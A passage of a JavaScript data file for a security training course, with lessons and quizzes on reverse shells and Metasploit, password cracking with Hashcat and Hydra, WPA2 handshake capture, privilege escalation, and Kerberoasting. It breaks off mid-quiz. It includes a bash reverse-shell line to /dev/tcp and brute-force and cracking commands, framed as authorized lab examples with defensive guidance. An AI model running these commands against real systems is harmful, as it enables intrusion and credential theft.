          id: 'net-infiltration',
          title: 'Network Infiltration & Metasploit',
          description: 'Leverage Netcat listeners, configure reverse shells, and deploy payloads using Metasploit.',
          duration: '18 mins',
          content: `### Network Infiltration & Metasploit

**Difficulty:** Intermediate  
**Estimated Study Time:** 18 Minutes  
**Prerequisites:** Active Reconnaissance & Port Scanning, Remote Operations (SSH, SCP, rsync)  

#### Learning Objectives
- Contrast **Reverse Shells** and **Bind Shells** under stateful enterprise firewall policies.
- Establish and verify remote network listeners using **Netcat (\`nc -lvnp\`)**.
- Navigate core **Metasploit Framework (\`msfconsole\`)** workflows (\`use\`, \`set\`, \`run\`) and explain how **Meterpreter** operates in memory.

#### Why It Matters
Understanding how shells traverse firewalls and how exploitation frameworks stage payloads is critical for both penetration testers proving exploitability and blue teams writing egress firewall and EDR detection rules. Even defenders who never launch Metasploit must recognize outbound shell behavior immediately in telemetry.

#### Prerequisites & Connections
This module extends **Active Reconnaissance & Port Scanning** and **Remote Operations (SSH, SCP, rsync)**. It leads directly into **Password Auditing & Cracking** and **Privilege Escalation**.

#### Core Explanation
Remote command execution vulnerabilities typically establish interactive control via two patterns:
- **Reverse Shell:** The compromised target initiates an outbound TCP connection back to the tester's listening host (\`LHOST\`/\`LPORT\`). Because perimeter firewalls typically drop unsolicited inbound traffic yet permit outbound ports (like TCP 443), reverse shells bypass inbound firewall rules reliably.
- **Bind Shell:** The target opens a listening TCP socket locally and waits for an inbound connection—commonly blocked by host firewalls or perimeter NAT.
- **Netcat (\`nc\`):** A minimal networking utility often used with \`-lvnp\` (**l**isten, **v**erbose, **n**umeric/no DNS, **p**ort) to catch incoming shells during manual assessments.
- **Metasploit Framework (\`msfconsole\`):** Modular testing suite separating **Exploits** (delivery vectors) from **Payloads** (code executed post-exploitation). You load modules with \`use <module_path>\`, configure target variables (\`RHOSTS\`, \`LHOST\`), and launch with \`run\` or \`exploit\`. **Meterpreter** is an advanced memory-resident payload injected via DLL/reflective loading rather than writing standard binary shells to disk.

#### How It Works
After confirming an exploitable service version on authorized lab target \`198.51.100.10\`, a tester opens a local listener (\`nc -lvnp 4444\`) on \`192.0.2.20\` or configures a Metasploit multi/handler. Once the exploit runs, the target triggers an outbound socket to \`192.0.2.20:4444\`, piping stdin/stdout/stderr back to the operator's terminal.

#### Real-World Context
Enterprise defenders counter both Metasploit payloads and custom reverse shells through **strict egress filtering** (denying workstations and servers arbitrary outbound connections to unknown IPs), behavioral EDR memory inspection (catching reflective DLL injection), and application allowlisting.

#### Examples
Configuring an authorized lab Netcat listener and Metasploit module workflow:
\`\`\`bash
# On the authorized assessment workstation (192.0.2.20), start a listener
nc -lvnp 4444

# Simulated lab verification of outbound shell redirection back to 192.0.2.20
bash -i >& /dev/tcp/192.0.2.20/4444 0>&1
\`\`\`
\`\`\`text
msf6 > search http_example
msf6 > use exploit/multi/handler
msf6 payload(linux/x64/meterpreter/reverse_tcp) > set LHOST 192.0.2.20
msf6 payload(linux/x64/meterpreter/reverse_tcp) > run
\`\`\`

#### Security Relevance
- **Defensive Value:** Implementing deny-by-default **egress firewall rules** on servers prevents compromised web or database nodes from dialing out to attacker C2 listeners—stopping most reverse shells cold.
- **Attacker Misuse:** Threat actors tunnel reverse shells over common outbound ports (80, 443, 53) and inject memory-resident stages to bypass legacy file-only antivirus scanning.

#### Common Mistakes
- Leaving test listeners bound on public interfaces without source-IP filtering during an assessment.
- Assuming memory-resident payloads like Meterpreter are undetectable—modern EDR hooks process creation, API calls, and unbacked memory allocations.
- Forgetting to document exact exploit timestamps and clean up test artifacts before closing an engagement.

#### Key Takeaways
- **Reverse shells** succeed behind firewalls because the target initiates an **outbound** connection to the listener rather than accepting unsolicited inbound traffic.
- **\`nc -lvnp <port>\`** starts a verbose Netcat listener without DNS resolution.
- **Metasploit** loads modules via **\`use <module_name>\`**; **Meterpreter** executes dynamically in memory (RAM).

#### Knowledge Check
- Why does strict server egress filtering block a reverse shell even when an attacker achieves remote code execution?
- What does each flag in \`nc -lvnp 4444\` control?
- How does a Meterpreter session differ operationally from dropping a standalone executable onto disk?

#### Further Learning
Review MITRE ATT&CK **Command and Scripting Interpreter (T1059)** and **Application Layer Protocol (T1071)** mitigations on egress containment.`,
          quiz: [
            {
              id: 'q-msf-1',
              question: 'Why are reverse shells generally preferred over bind shells during security assessments?',
              options: [
                "The target dials out to the listener, bypassing inbound blocks.",
                "They operate cleanly without requiring elevated host privileges.",
                "They wrap interactive sessions automatically in mutual TLS.",
                "They execute noticeably faster over congested wireless links."
              ],
              correctOption: 0,
              explanation: 'Firewalls typically block unsolicited incoming traffic (affecting bind shells) but allow outbound traffic, making reverse shells highly effective.'
            },
            {
              id: 'q-msf-2',
              question: 'Which Metasploit payload runs entirely in the victim system\'s memory (RAM), avoiding writing files to disk and evading AV detection?',
              options: [
                "add_user",
                "generic/shell_bind_tcp",
                "shell_reverse_tcp",
                "Meterpreter"
              ],
              correctOption: 3,
              explanation: 'Meterpreter is an advanced, memory-resident payload that loads dynamically via DLL injection, evading standard file-based AV detection.'
            },
            {
              id: 'q-msf-3',
              question: 'Which Netcat flag configuration sets up a local listening port, displays verbose feedback, and disables DNS lookups?',
              options: [
                "nc -e sh <port>",
                "nc -zv <port>",
                "nc -lvnp <port>",
                "nc -w 10 <port>"
              ],
              correctOption: 2,
              explanation: 'The flags represent: Listen (-l), Verbose (-v), Numeric-only/No DNS (-n), and Port (-p).'
            },
            {
              id: 'q-msf-4',
              question: 'In Metasploit, what is the command used to select and load an exploit module into the console environment?',
              options: [
                "set <module_name>",
                "use <module_name>",
                "run <module_name>",
                "search <module_name>"
              ],
              correctOption: 1,
              explanation: 'The "use" command loads a specific exploit, auxiliary, or post-exploitation module into the active workspace.'
            }
          ]
        },
        {
          id: 'password-attacks',
          title: 'Password Auditing & Cracking',
          description: 'Crack hashes using Hashcat and John the Ripper, and run Hydra brute force campaigns.',
          duration: '18 mins',
          content: `### Password Auditing & Cracking

**Difficulty:** Intermediate  
**Estimated Study Time:** 18 Minutes  
**Prerequisites:** Access Control & Permissions (chmod, chown, sudo), Active Directory & Event Logs  

#### Learning Objectives
- Explain why cryptographic hashing is a **one-way** mathematical transformation and how offline cracking works.
- Contrast GPU-accelerated **Hashcat** and CPU-focused **John the Ripper** offline attacks against online **Hydra** testing (\`-L/-P\` vs \`-l/-p\`).
- Differentiate high-noise single-account brute forcing from stealthier **Password Spraying**.

#### Why It Matters
When defenders audit credential hygiene or adversaries dump password hashes from misconfigured backups or directory services, weak passwords collapse immediately under modern GPU rulesets. Auditing password strength proves why phishing-resistant MFA, long passphrases, and memory-hard hashing (Argon2id) are mandatory.

#### Prerequisites & Connections
This module builds on **Access Control & Permissions (chmod, chown, sudo)** and **Active Directory & Event Logs** (with **Network Infiltration & Metasploit** and **Authentication, Sessions & Identity Protocols** as recommended context). It leads straight into **Wireless Security Vectors** (offline WPA2 cracking).

#### Core Explanation
Credential auditing splits into **offline** hash recovery and **online** authentication testing:
- **One-Way Cryptographic Hashing:** Password hashes cannot be mathematically inverted back into plaintext. Offline cracking computes hashes of candidate guesses (dictionaries, rules, masks) and compares outputs until a digest matches.
- **Offline Crackers:**
  - **Hashcat:** Massively parallel GPU cracker capable of testing billions of fast hashes per second using rule files and mask attacks.
  - **John the Ripper (JtR):** Versatile CPU cracker commonly used with format extractors (\`ssh2john\`, \`zip2john\`) for system password files and archive keys.
- **Online Attacks:**
  - **Hydra:** Sends authentication attempts live against network services (SSH, FTP, HTTP forms), using \`-l\`/\`-p\` for single strings or uppercase **\`-L\`/\`-P\`** for username and password list files.
  - **Password Spraying:** Tests one or two ubiquitous passwords (like seasonal company patterns) across *many* accounts sequentially—staying below per-account lockout thresholds that high-speed single-user brute force triggers.

#### How It Works
Suppose an audit obtains unsalted SHA-256 digests or NTLM hashes. Offline, Hashcat hashes each wordlist line modified by common patterns (capitalized first letter + trailing year/symbol) on a GPU with zero lockouts or logs on the victim server. Online, defenders detect excessive failed logons (such as Windows Event ID 4625) unless low-and-slow spraying slips under per-user counters—making account-independent anomaly correlation vital.

#### Real-World Context
NIST SP 800-63B updated password guidance away from arbitrary 90-day rotation and forced special-character complexity—which actually produced predictable patterns like \`Winter2026!\` ideal for Password Spraying—toward **long passphrases**, mandatory **breached-password blocklists**, rate limiting, and phishing-resistant MFA.

#### Examples
Authorized lab auditing commands targeting sample test hashes and a lab SSH host (\`198.51.100.5\`):
\`\`\`bash
# Offline dictionary check on sample Raw-SHA256 digests with John the Ripper
john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt sample_hashes.txt

# GPU-accelerated offline audit with Hashcat (mode 1400 = SHA-256)
hashcat -m 1400 -a 0 sample_hashes.txt /usr/share/wordlists/rockyou.txt

# Online credential audit specifying username list (-L) and password list (-P)
hydra -L users.txt -P candidate_passwords.txt 198.51.100.5 ssh
\`\`\`

#### Security Relevance
- **Defensive Value:** Enforcing Argon2id/bcrypt for stored secrets, banning known breached passwords, deploying MFA, and alerting on horizontal distributed login failures (Password Spraying) neutralizes both offline cracking and online spraying.
- **Attacker Misuse:** Adversaries run credential stuffing using leaked breach dumps, spray seasonal passwords across cloud SSO portals, and feed dumped NTLM/Kerberos hashes into GPU cracking rigs.

#### Common Mistakes
- Relying solely on per-account 5-attempt lockout thresholds without monitoring cross-account Password Spraying bursts.
- Using fast unsalted hashes (MD5/SHA-256) for user passwords—even complex 10-character passwords fall rapidly to GPUs if hashed quickly without work factors.
- Executing aggressive online Hydra runs against production Active Directory accounts and causing organization-wide Denial of Service via mass lockouts.

#### Key Takeaways
- Hashing is a **one-way** mathematical function—offline tools compare candidate hashes rather than "decrypting".
- **Hashcat** excels at GPU-accelerated cracking; **Hydra** uses uppercase **\`-L\` and \`-P\`** for online username/password wordlists.
- **Password Spraying** tries a few common passwords across many accounts to evade single-account lockouts.

#### Knowledge Check
- Why does increasing password length (15+ characters) dramatically slow offline cracking compared to swapping \`a\` for \`@\`?
- Why can Password Spraying compromise an organization even when a 5-failure lockout policy is enforced?
- What is the operational difference between Hydra's \`-l/-p\` and \`-L/-P\` flags?

#### Further Learning
Review NIST SP 800-63B Digital Identity Guidelines on memorized secret verification and breached-password checking.`,
          quiz: [
            {
              id: 'q-pw-1',
              question: 'Why are hashing functions considered "one-way" mathematical operations?',
              options: [
                "Legacy hashing algorithms only compile cleanly on 32-bit processors.",
                "Password verification hashes require live internet CA queries to work.",
                "One-way hash functions cannot be mathematically inverted to plaintext.",
                "Cryptographic hashes can only execute once per authenticated user session."
              ],
              correctOption: 2,
              explanation: 'Hashing is a one-way cryptographic function. Reversing it is mathematically infeasible, so cracked hashes must be found by hashing guesses and comparing the outputs.'
            },
            {
              id: 'q-pw-2',
              question: 'Which password cracking tool specializes in GPU-accelerated hash cracking using rules and masks?',
              options: [
                "Hashcat",
                "Nmap",
                "Burp Suite",
                "Hydra"
              ],
              correctOption: 0,
              explanation: 'Hashcat is highly optimized for GPU architecture, making it the standard tool for fast, offline password and hash cracking.'
            },
            {
              id: 'q-pw-3',
              question: 'Which of the following describes a "Password Spraying" attack?',
              options: [
                "Cracking captured SSH private key passphrases offline with a GPU.",
                "Testing one common password across many accounts to avoid lockouts.",
                "Testing thousands of candidate passwords against one targeted admin account.",
                "Capturing cleartext login credentials directly off a shared LAN switch."
              ],
              correctOption: 1,
              explanation: 'Password spraying tests a few common passwords against many accounts, staying under login failure thresholds to bypass account lockout policies.'
            },
            {
              id: 'q-pw-4',
              question: 'Which Hydra flag configuration defines a list of usernames and a list of passwords to use in an attack?',
              options: [
                "hydra -list <user_list> -pass <pass_list>",
                "hydra --users --passwords",
                "hydra -u <user_list> -p <pass_list>",
                "hydra -L <user_list> -P <pass_list>"
              ],
              correctOption: 3,
              explanation: 'In Hydra, uppercase "-L" and "-P" flags specify files containing lists of usernames and passwords, whereas lowercase "-l" and "-p" specify single values.'
            }
          ]
        },
        {
          id: 'wireless-security',
          title: 'Wireless Security Vectors',
          description: 'Analyze WPA2/WPA3 handshakes, run deauthentication attacks, and audit wireless networks using Aircrack-ng.',
          duration: '15 mins',
          content: `### Wireless Security Vectors

**Difficulty:** Intermediate  
**Estimated Study Time:** 15 Minutes  
**Prerequisites:** Network Topologies, OSI & TCP/IP Reference models, Password Auditing & Cracking  

#### Learning Objectives
- Contrast **WPA2-PSK** offline dictionary vulnerabilities against **WPA3-SAE** (Simultaneous Authentication of Equals).
- Explain how **deauthentication frames** induce clients to reconnect and expose the 4-way handshake—and how IEEE 802.11w Protected Management Frames stop it.
- Trace the **Aircrack-ng** workflow (\`airmon-ng\`, \`airodump-ng\`, \`aireplay-ng\`, \`aircrack-ng\`).

#### Why It Matters
Unlike wired Ethernet switches, radio frequency (RF) frames broadcast physically beyond walls and parking lots. If an organization relies on weak Wi-Fi pre-shared keys or legacy guest configurations without proper network isolation, anyone within RF range can capture authentication exchanges silently or force reconnects.

#### Prerequisites & Connections
This module combines **Network Topologies, OSI & TCP/IP Reference models** with offline wordlist cracking concepts from **Password Auditing & Cracking**, reinforcing wireless perimeter segmentation.

#### Core Explanation
Wi-Fi security standards dictate how clients authenticate and derive session encryption keys:
- **WPA2-PSK (Pre-Shared Key):** Uses AES-CCMP encryption derived from a shared passphrase during a 4-way EAPOL handshake. Because the Pairwise Master Key (PMK) derives deterministically from the static PSK and SSID, capturing just one 4-way handshake lets an attacker run unlimited offline dictionary guesses against the passphrase.
- **Deauthentication Attacks:** Legacy IEEE 802.11 management frames are unauthenticated. Sending spoofed deauthentication frames knocks connected clients offline briefly so they immediately re-associate, broadcasting a fresh 4-way handshake over the air.
- **WPA3-SAE (Simultaneous Authentication of Equals / Dragonfly):** Replaces static PSK key derivation with a zero-knowledge password-authenticated key exchange that creates fresh forward-secret session keys and defeats offline dictionary cracking, while requiring Protected Management Frames (802.11w) to block spoofed deauth frames.
- **Aircrack-ng Suite:** Integrates \`airmon-ng\` (enables monitor mode on compatible adapters), \`airodump-ng\` (captures raw wireless frames and handshakes), \`aireplay-ng\` (authorized frame injection tests), and \`aircrack-ng\` (offline handshake auditing).

#### How It Works
Inside an authorized RF lab cage, \`airmon-ng start wlan0\` switches the wireless interface into Monitor Mode (\`wlan0mon\`) so it captures all nearby 802.11 frames without associating to an access point. \`airodump-ng\` logs beacons and listens for the 4 EAPOL handshake frames whenever a client connects (or reconnects after a controlled deauth test). Once captured in a \`.cap\` file, \`aircrack-ng\` hashes wordlist passwords against the handshake MIC.

#### Real-World Context
Enterprises eliminate shared-password cracking risks completely on corporate SSIDs by moving off Pre-Shared Keys entirely onto **WPA2/WPA3-Enterprise (802.1X / RADIUS)** with per-user or device TLS certificates, while enforcing **802.11w Protected Management Frames** and isolating guest Wi-Fi onto separate firewall-restricted VLANs.

#### Examples
Authorized lab workflow for auditing a lab test SSID:
\`\`\`bash
# 1. Switch wireless interface into Monitor Mode
sudo airmon-ng start wlan0

# 2. Capture wireless beacons and handshakes on channel 6
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w lab_capture wlan0mon

# 3. Audit captured 4-way handshake offline with a wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF lab_capture-01.cap
\`\`\`

#### Security Relevance
- **Defensive Value:** Deploying WPA3-SAE (or 802.1X Enterprise certificates), enabling Protected Management Frames (802.11w), and segmenting Wi-Fi traffic behind NAC/VLAN boundaries eliminates offline PSK cracking and rogue deauth disruption.
- **Attacker Misuse:** Attackers park near offices to capture WPA2 handshakes or PMKID frames, crack weak passphrases offline, or spin up Evil Twin rogue access points targeting misconfigured client profiles.

#### Common Mistakes
- Assuming a "hidden SSID" (disabling SSID broadcast) secures a wireless network—client probe requests leak the SSID continuously.
- Mixing up **\`airmon-ng\`** (monitor mode setup) with **\`airodump-ng\`** (packet capture) or **\`aireplay-ng\`** (frame injection).
- Running deauth tests outside shielded labs or unauthorized RF spaces, disrupting third-party public Wi-Fi networks.

#### Key Takeaways
- **WPA2-PSK** exposes captured 4-way handshakes to **offline dictionary cracking**.
- **Deauthentication attacks** disconnect clients temporarily to capture their re-authentication 4-way handshake.
- **\`airmon-ng\`** puts wireless adapters into monitor mode; **WPA3-SAE** replaces PSK to block offline dictionary cracking.

#### Knowledge Check
- Why does capturing a single WPA2-PSK 4-way handshake allow unlimited guessing without staying near the target AP?
- How does WPA3's Simultaneous Authentication of Equals (SAE) defeat offline dictionary attacks?
- Why is IEEE 802.1X (WPA-Enterprise) superior to shared passphrases in corporate offices?

#### Further Learning
Review IEEE 802.11w Protected Management Frames and NIST SP 800-153 (*Guidelines for Securing Wireless Local Area Networks*).`,
          quiz: [
            {
              id: 'q-wl-1',
              question: 'Which wireless security protocol is vulnerable to offline dictionary cracking attacks if an attacker captures the initial 4-way authentication handshake?',
              options: [
                "WPA2-PSK",
                "WPA3-SAE",
                "WPA Enterprise",
                "WEP"
              ],
              correctOption: 0,
              explanation: 'WPA2-PSK handshakes can be captured and cracked offline using wordlists, as the handshake generation math relies on the static pre-shared key.'
            },
            {
              id: 'q-wl-2',
              question: 'What is the function of a Deauthentication attack in wireless penetration testing?',
              options: [
                "To overwrite the access point broadcast SSID string remotely.",
                "To permanently corrupt the access point flash firmware partition.",
                "To drop clients so they reconnect and expose the 4-way handshake.",
                "To strip WPA2-AES payload encryption cleanly in mid-flight."
              ],
              correctOption: 2,
              explanation: 'Deauth attacks force target devices off the wireless ring, letting you intercept their subsequent reconnect handshake for cracking.'
            },
            {
              id: 'q-wl-3',
              question: 'Which tool in the Aircrack-ng suite is used to place a wireless network adapter into monitor mode?',
              options: [
                "airodump-ng",
                "airmon-ng",
                "aireplay-ng",
                "aircrack-ng"
              ],
              correctOption: 1,
              explanation: '"airmon-ng" manages wireless interface monitor configurations, enabling the card to capture raw over-the-air packets without joining a network.'
            },
            {
              id: 'q-wl-4',
              question: 'Which technology in WPA3 replaces WPA2\'s Pre-Shared Key (PSK) handshake, protecting against offline dictionary attacks?',
              options: [
                "Static 104-bit WEP Shared Keys",
                "Legacy MD5 Challenge-Handshake Authentication",
                "Temporal Key Integrity Protocol (TKIP)",
                "Simultaneous Authentication of Equals (SAE)"
              ],
              correctOption: 3,
              explanation: 'SAE uses a secure handshake key exchange protocol (Dragonfly) that prevents offline cracking, protecting even weak passwords from offline dictionary attacks.'
            }
          ]
        }
      ]
    },
    {
      id: 'post-exploit-privesc',
      title: 'Post-Exploitation & Privilege Escalation',
      category: 'offense',
      lessons: [
        {
          id: 'priv-esc',
          title: 'Privilege Escalation',
          description: 'Harness misconfigured SUID binaries, kernel exploits, service paths, and DLL Hijacking to escalate to root/SYSTEM.',
          duration: '22 mins',
          content: `### Privilege Escalation

**Difficulty:** Advanced  
**Estimated Study Time:** 22 Minutes  
**Prerequisites:** Network Infiltration & Metasploit, Access Control & Permissions (chmod, chown, sudo)  

#### Learning Objectives
- Enumerate Linux local privilege escalation paths including **SUID** root binaries, permissive \`sudo -l\` rules, and writable \`cron\` scripts (referencing **GTFOBins**).
- Diagnose Windows privilege escalation weaknesses including **Unquoted Service Paths**, **DLL Hijacking**, and **UAC** bypasses toward **\`NT AUTHORITY\\SYSTEM\`**.
- Apply least-privilege file ownership, quoting, and service hardening fixes to close local elevation paths.

#### Why It Matters
Initial access almost always lands in a restricted service or unprivileged user context (such as \`www-data\`). **Privilege Escalation** determines whether a single web bug stays contained on one account or hands full administrative control (\`root\` or \`SYSTEM\`) over the host, credentials in memory, and trusted domain relationships.

#### Prerequisites & Connections
This module unites local OS permissions from **Access Control & Permissions (chmod, chown, sudo)** with initial access from **Network Infiltration & Metasploit**. Achieving host administrative control directly enables **Active Directory Exploitation** and **Post Exploitation Tactics**.

#### Core Explanation
Local privilege escalation abuses misconfigured permissions, trust boundaries, or unpatched kernel bugs:
- **Linux Elevation Vectors:**
  - **SUID Binaries (\`chmod u+s\` / mode \`4000\`):** When owned by \`root\`, invoking an SUID binary runs it with effective UID \`0\` (\`root\`). If the binary allows shell escapes, file writes, or library loading documented in **GTFOBins**, callers escalate to \`root\`.
  - **Sudo Rules (\`sudo -l\`) & Writable Cron Jobs:** Allowing standard accounts passwordless \`sudo\` on interpreters or scheduled root scripts in writable paths lets users inject commands executed as \`root\`.
- **Windows Elevation Vectors:**
  - **Highest Local Context:** **\`SYSTEM / NT AUTHORITY\\SYSTEM\`** represents the core OS execution level (analogous to Linux \`root\`).
  - **Unquoted Service Paths:** When a privileged service path contains spaces without quotation marks (e.g., \`C:\\Program Files\\Vendor App\\svc.exe\`), Windows tries executing \`C:\\Program.exe\`, then \`C:\\Program Files\\Vendor.exe\` sequentially—allowing hijacking if parent directories are writable.
  - **DLL Hijacking & Service Permissions:** Placing a rogue DLL ahead in Windows' DLL search order or replacing an unhardened service binary executes code inside the privileged service context.

#### How It Works
Enumeration scripts (such as LinPEAS or WinPEAS inside authorized engagements) check file permissions, running services, scheduled tasks, and kernel patch levels. Finding a root-owned SUID binary on Linux or an unquoted spaced service path alongside writable folder permissions on Windows exposes an immediate elevation pathway without needing external network traffic.

#### Real-World Context
Hardening OS builds against local escalation is a primary CIS Benchmark goal: administrators audit \`find / -perm -4000\` outputs regularly, remove unnecessary SUID bits, quote every Windows service \`ImagePath\` registry value, and ensure low-privilege users can never write inside \`C:\\Program Files\\\` or root cron directories.

#### Examples
Auditing Linux SUID binaries and checking Windows service paths:
\`\`\`bash
# Enumerate root-owned SUID binaries on Linux
find / -perm -4000 -user root -type f 2>/dev/null

# Review permitted sudo commands for the current user
sudo -l
\`\`\`
\`\`\`powershell
# Query Windows services for unquoted paths outside C:\Windows
Get-CimInstance Win32_Service | Where-Object {
  $_.PathName -notlike '"*' -and $_.PathName -like '* *' -and $_.PathName -notlike 'C:\Windows*'
} | Select-Object Name, PathName, StartMode
\`\`\`

#### Security Relevance
- **Defensive Value:** Enforcing Least Privilege on service accounts, stripping unused SUID flags, quoting Windows service paths, and keeping kernels patched stops low-privilege bugs from becoming full system takeovers.
- **Attacker Misuse:** Threat actors immediately inspect \`sudo -l\`, SUID binaries, cron tasks, and service ACLs after landing a shell to elevate to \`root\` or \`NT AUTHORITY\\SYSTEM\` before dumping credentials.

#### Common Mistakes
- Confusing standard Windows local \`Administrator\` prompts with \`NT AUTHORITY\\SYSTEM\` core OS privileges (or ignoring UAC boundaries).
- Leaving scripts writable by non-root service users inside directories executed by root \`cron\` jobs or systemd timers.
- Focusing only on remote firewall rules while ignoring local OS filesystem and service permission hygiene.

#### Key Takeaways
- **SUID root binaries** execute with \`root\` privileges regardless of caller—check **GTFOBins** for abused binaries.
- Windows **Unquoted Service Paths** with spaces can execute attacker binaries placed earlier in the path lookup order.
- **\`SYSTEM / NT AUTHORITY\\SYSTEM\`** is the highest local privileged execution account on Windows.

#### Knowledge Check
- Why does a path like \`C:\\Program Files\\App Tool\\service.exe\` without quotes pose a risk if \`C:\\\` allows file creation?
- What is GTFOBins used for by both red teamers and Linux hardening engineers?
- Why should root \`cron\` scripts never reside inside user-writable folders?

#### Further Learning
Consult the CIS Distribution Independent Linux and Microsoft Windows Server Benchmarks on filesystem permission auditing and service path hardening.`,
          quiz: [
            {
              id: 'q-pe-1',
              question: 'What is the security risk of a Linux binary having the SUID (Set Owner User ID) bit set and owned by root?',
              options: [
                "Callers inherit root privileges, creating escalation risk if abused.",
                "Executing the tool silences local syslog and kernel audit logs.",
                "Unprivileged local users are denied permission to invoke the binary.",
                "The binary removes itself from /usr/bin immediately after exit."
              ],
              correctOption: 0,
              explanation: 'SUID executes binaries with the privileges of the file owner (root). If an SUID file is vulnerable or misconfigured, attackers can exploit it to spawn a root console.'
            },
            {
              id: 'q-pe-2',
              question: 'Which of the following describes a Windows "Unquoted Service Path" vulnerability?',
              options: [
                "A Windows service binary lacking an Authenticode vendor signature.",
                "A background service configured to launch under a low-privilege account.",
                "A hidden Registry startup key concealed from standard Administrators.",
                "An unquoted spaced path letting attackers hijack early binary lookup."
              ],
              correctOption: 3,
              explanation: 'When service paths contain spaces and are unquoted, Windows attempts to execute files matching parts of the path sequentially. Placing a file named "Program.exe" in "C:\\" can hijack services located under "C:\\Program Files\\".'
            },
            {
              id: 'q-pe-3',
              question: 'Which online repository is the standard resource for finding methods to exploit misconfigured SUID binaries or sudo privileges on Linux?',
              options: [
                "LOLBAS",
                "GTFOBins",
                "GitHub",
                "ExploitDB"
              ],
              correctOption: 1,
              explanation: 'GTFOBins compiles methods for abusing standard Linux binaries that have SUID or sudo configurations to escalate privileges.'
            },
            {
              id: 'q-pe-4',
              question: 'What is the equivalent high-privilege administrative account on Windows systems that corresponds to "root" on Linux?',
              options: [
                "Administrator",
                "Domain User",
                "SYSTEM / NT AUTHORITY\\SYSTEM",
                "Local Group Policy"
              ],
              correctOption: 2,
              explanation: 'The SYSTEM account holds the highest local execution privileges on Windows, representing the core OS environment.'
            }
          ]
        },
        {
          id: 'ad-exploitation',
          title: 'Active Directory Exploitation',
          description: 'Leverage Kerberos attacks, run BloodHound graphs, and execute Kerberoasting/AS-REP Roasting.',
          duration: '22 mins',
          content: `### Active Directory Exploitation

**Difficulty:** Advanced  
**Estimated Study Time:** 22 Minutes  
**Prerequisites:** Privilege Escalation, Active Directory & Event Logs  

#### Learning Objectives
- Map nested Active Directory permissions, ACLs, and domain escalation paths using **BloodHound**.
- Contrast **Kerberoasting** (SPN TGS ticket extraction) and **AS-REP Roasting** (missing Kerberos preauthentication) plus **Pass-the-Hash (PtH)** NTLM lateral movement.
- Design domain defenses including Group Managed Service Accounts (gMSA), Kerberos preauthentication, Protected Users, and tiered admin isolation.

#### Why It Matters
Once an attacker compromises a single corporate workstation, Active Directory makes every user, workstation, and server part of an interconnected identity graph. Most major enterprise breaches escalate not through unpatched zero-days, but through weak service account passwords, nested admin groups, and Kerberos misconfigurations.

#### Prerequisites & Connections
This module extends **Active Directory & Event Logs** and **Privilege Escalation**, leading into domain persistence and credential harvesting in **Post Exploitation Tactics**.

#### Core Explanation
Enterprise Active Directory assessments focus on identity relationships and protocol mechanics:
- **BloodHound:** Ingests AD users, groups, ACLs, sessions, and GPO relationships via collectors (e.g., SharpHound) into a graph database, revealing multi-hop attack paths toward **Domain Admin** that human audits miss.
- **Kerberoasting:** Any authenticated domain user can request a **Ticket Granting Service (TGS)** ticket for any account registered with a **Service Principal Name (SPN)**. Because that TGS ticket is encrypted using the service account's NTLM/AES key, testers request the ticket and crack weak service account passwords offline without touching the service server.
- **AS-REP Roasting:** Targets user accounts flagged *"Do not require Kerberos preauthentication"*, allowing an attacker to request an unauthenticated **AS-REP** response and crack the encrypted portion offline.
- **Pass-the-Hash (PtH):** Abuses Windows NTLM authentication by passing a captured NTLM password hash directly to authenticate to remote hosts without needing the cleartext password.

#### How It Works
Starting from a single standard domain user shell, an operator collects AD group and session telemetry for BloodHound, spots a service account with a weak password policy and an SPN, requests a TGS ticket from the Domain Controller (Event ID 4769), and inspects ticket encryption offline. Meanwhile, blue teams monitor Event ID **4769** spikes requesting weak RC4 (\`0x17\`) TGS encryption and **4768** preauth-disabled requests.

#### Real-World Context
Defenders break Kerberoasting cleanly by migrating service identities to **Group Managed Service Accounts (gMSAs)**—whose 120-byte random passwords rotate automatically—or 25+ character randomized service passwords, enforcing AES-only Kerberos encryption, placing Tier 0 admins in the **Protected Users** group (blocking NTLM/delegation), and running BloodHound defensively to prune toxic ACLs.

#### Examples
Defensive PowerShell auditing for Kerberoasting and AS-REP Roasting exposure:
\`\`\`powershell
# Audit user accounts with registered SPNs (Kerberoasting candidates)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName, PasswordLastSet

# Audit accounts missing Kerberos Preauthentication (AS-REP Roasting candidates)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
\`\`\`

#### Security Relevance
- **Defensive Value:** Migrating to gMSAs, enforcing Kerberos preauthentication, disabling legacy RC4 ticket encryption, blocking NTLM where feasible, and enforcing Active Directory Tiering (never logging Domain Admins into regular workstations) stops AD graph escalation.
- **Attacker Misuse:** Adversaries enumerate BloodHound paths silently using normal LDAP queries, harvest TGS tickets for service accounts running SQL/IIS with Domain Admin rights, and move laterally via Pass-the-Hash without cracking complex passwords.

#### Common Mistakes
- Granting service accounts Domain Admin privileges or long-lived static passwords instead of gMSAs.
- Allowing Domain Admins to sign in interactively to standard developer or end-user workstations, exposing Tier 0 credentials in local memory.
- Ignoring delegation rights (\`WriteDacl\`, \`GenericAll\`, unconstrained delegation) that grant implicit control even without direct group membership.

#### Key Takeaways
- **Kerberoasting** extracts **TGS** tickets for accounts with **SPNs** and cracks weak service passwords offline.
- **AS-REP Roasting** targets accounts where **Kerberos preauthentication** is disabled.
- **BloodHound** applies graph theory to expose nested AD trust and privilege paths; **Pass-the-Hash** authenticates using stolen NTLM hashes directly.

#### Knowledge Check
- Why does requesting a TGS ticket for Kerberoasting generate almost no suspicious traffic on the target application server itself?
- How do Group Managed Service Accounts (gMSAs) eliminate practical Kerberoasting risk?
- What Windows Event IDs help defenders detect RC4 Kerberoasting bursts on a Domain Controller?

#### Further Learning
Review Microsoft's Active Directory Tiered Administration model and MITRE ATT&CK **Steal or Forge Kerberos Tickets (T1558)**. `,
          quiz: [
            {
              id: 'q-ad-1',
              question: 'Which Active Directory attack involves requesting Kerberos Ticket Granting Service (TGS) tickets for service accounts and cracking their password hashes offline?',
              options: [
                "Golden Ticket",
                "Kerberoasting",
                "Pass-the-Hash (PtH)",
                "AS-REP Roasting"
              ],
              correctOption: 1,
              explanation: 'Kerberoasting requests TGS tickets for accounts with Service Principal Names (SPNs). Since these tickets are encrypted with the service account\'s password hash, they can be captured and cracked offline.'
            },
            {
              id: 'q-ad-2',
